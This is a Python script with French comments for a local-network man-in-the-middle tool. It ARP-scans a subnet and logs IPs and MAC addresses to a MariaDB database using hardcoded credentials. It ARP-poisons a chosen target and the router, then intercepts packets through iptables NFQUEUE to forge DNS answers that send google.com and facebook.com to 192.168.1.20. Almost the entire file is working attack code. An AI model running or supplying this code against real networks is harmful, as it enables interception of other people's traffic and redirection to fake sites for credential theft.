# !/usr/bin/python
# -*- coding: utf-8

from scapy.all import *
from netfilterqueue import NetfilterQueue
import os 
import sys
import time
from datetime import date
import mariadb


mydb = mariadb.connect(
	host="localhost",
	user="MIMT",
	password="mitmpass",
	database="mitm_tool"
	)

mycursor = mydb.cursor()


"""
def scan_ip(plage_ip): #on crée une fonction qui va cherher les ip disponibles sur la palge ip saisi
	rep, nonRep = sr(IP(dst=plage_ip)/ICMP()) #on crée et envoi un paquet IP() et CMTP() a destination de la plage ip a scanner 
	list_ip=[] # on cree une list pour y stocker la list des ip displonible sur le réseau local 
	for element in rep : #pour tout element dans la liste rep
		list_ip.append(element[1].src) # on ajoute chaque ip qui a repondun dans la list 
	return list_ip # on renvoi le resultat de la  list 

"""

def insert_data(list_plage_ip, data_ip_active):
	it1 = iter(list_plage_ip)
	tuple_plage_ip = zip(it1, it1)
	tuple_plage_ip = list(tuple_plage_ip)
	print(tuple_plage_ip)

	it2 = iter(data_ip_active)
	tuple_ip_active = zip(it2, it2, it2)
	tuple_ip_active = list(tuple_ip_active)
	print(tuple_ip_active)

	Q1="INSERT INTO Ip_active(date,Ip_active,Adresse_mac,plage_ip) VALUES(%s, %s, %s,%s)"

	mycursor.executemany("INSERT INTO Plage_ip (Ip, date) VALUES(%s, %s)",tuple_plage_ip)
	last_id = mycursor.lastrowid

	for x in tuple_ip_active:
		print(x)
		mycursor.execute(Q1,x+(last_id,))

	mydb.commit()

	
def add_plage_ip(data):

	mycursor = mydb.cursor()
	mycursor.execute("""INSERT INTO Plage_ip (Ip, date) VALUES(%s, %s)""", data)
	mydb.commit()

def scan_ip(plage_ip):

	list_ip = []
	request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=plage_ip)
	rep, nonRep = srp(request, timeout=2, retry=1)

	for sent, receive in rep:
		list_ip.append(receive.psrc)
	return list_ip


def get_Ip_Active(list_IP):
	today = date.today()
	dateinfo = today.strftime("%d %B %y")
	data_ip_active = [] # je crée une liste pour y stoké les info qui irons dans la base de donnée 
	for ip in list_IP : # pour les ip contenue dans la list_IP
		arp_requests=ARP(pdst=ip) # on crée une requete arp qui aura pour destination les ip trouver 
		broadcast=Ether(dst="ff:ff:ff:ff:ff:ff") #on crée un trame ethernet qui a pour dst l'adresse MAC de broadcast
		arp_requests_broadcast = broadcast/arp_requests  #on combine ses deux trames
	
		rep=srp(arp_requests_broadcast, timeout=5, verbose=False )[0] #on les envoi est on recupere la reponse 
		for element in rep : #pour les element dans la reponse 
			data_ip_active.append(dateinfo)# j'ajoute la date du jour a ma list pour la bdd
			data_ip_active.append(element[1].psrc) # j'ajoute l'adresse ip 
			data_ip_active.append(element[1].hwsrc) #j'joute l'adresse mac
			

	return data_ip_active


def scan_Mac(list_IP): #on cree un fontion qui va trouver les adresses mac correspondant au ip 
	dic_info ={}	#on crée un dictionnaire vide pour pouvoir y stocker nos informations	
	for ip in list_IP : # pour les ip contenue dans la list_IP
		arp_requests=ARP(pdst=ip) # on crée une requete arp qui aura pour destination les ip trouver 
		broadcast=Ether(dst="ff:ff:ff:ff:ff:ff") #on crée un trame ethernet qui a pour dst l'adresse MAC de broadcast
		arp_requests_broadcast = broadcast/arp_requests  #on combine ses deux trames
	
		rep=srp(arp_requests_broadcast, timeout=5, verbose=False )[0] #on les envoi est on recupere la reponse 
		for element in rep : #pour les element dans la reponse 
			print("adresse ip cible : {}\nAdresse Mac = {} ".format(element[1].psrc,element[1].hwsrc)) # on recupere les info de ip et de son adresse mac
			print("---------------------------")

			dic_info[element[1].psrc]=element[1].hwsrc # place l'ip et l'adresse mac dans le dictionnaire 

	

	return dic_info #on renvoi le dictionnaire qui contient nos ip et nos adresse MAC


def recup_mac_adress(dic_info):
	for ip, mac in dic_info.items():
		adressMac = mac 

	return adressMac 


def atck_mitm(targetIP, routerIP ,RouterMac, targetMac) :
	send(ARP(op=2,pdst=targetIP, psrc=routerIP, hwdst=targetMac),verbose=False)
	send(ARP(op=2, pdst=routerIP , psrc=targetIP , hwdst=RouterMac) ,verbose=False)
	

def reARP(targetIP, routerIP, RouterMac, targetMac):
	send(ARP(pdst=routerIP, psrc=targetIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=targetMac), count=5)
	send(ARP(pdst=targetIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=RouterMac), count=5)
	os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

def list_ip():
	nombre_ip = int(input("saissez le nombre d'ip que vous souhaiter spoofer : "))
	i = 0
	list_ip=[]

	while i < nombre_ip :
		ip = input("saisisser l ip a scanner: ")
		list_ip.append(ip)
		i += 1

	return list_ip
	
dns_hosts = {
    b"www.google.com": "192.168.1.20",
    b"google.com": "192.168.1.20",
    b"www.facebook.com": "192.168.1.20"
}


def recup_packet(packet): #nous allons recuperer les packet qui sont mis dans notre liste d'attente grace a netfilter

	packet_scapy = IP(packet.get_payload()) #on converti les packet netfilter en packet scapy 

	if packet_scapy.haslayer(DNS): #si le paquet est de type DNS, on le modifie
		print("requete dns :", packet_scapy.summary)
		try : 
			modify_packet=modif_packet(packet_scapy) #on utilise une fonction qui modifira notre packet
		except IndexError : 
			pass

		print("[Aprés]:",modify_packet.summary())
		packet.set_payload(bytes(modify_packet)) #on converti le packet modifié en paquet netfilter
	packet.accept()
				

def modif_packet(packet):


	qname=packet[DNSQR].qname
	print("qname : {} ".format(qname))
	if qname in dns_hosts: # si le site web est dans la liste 
		packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname]) #on crée une nouvelle reponse dns qui va remplacer l'original
		packet[DNS].ancount=1
	
		del packet[IP].len
		del packet[IP].chksum
		del packet[UDP].len
		del packet[UDP].chksum


	return packet # on renvoi le paquet modifier 



def dns_spoof():

	os.system("iptables -I FORWARD -j NFQUEUE --queue-num 1 ")

	queue = NetfilterQueue()
	try:
		queue.bind(1,recup_packet)
		queue.run()
	except KeyboardInterrupt :
			os.system("iptables --flush")


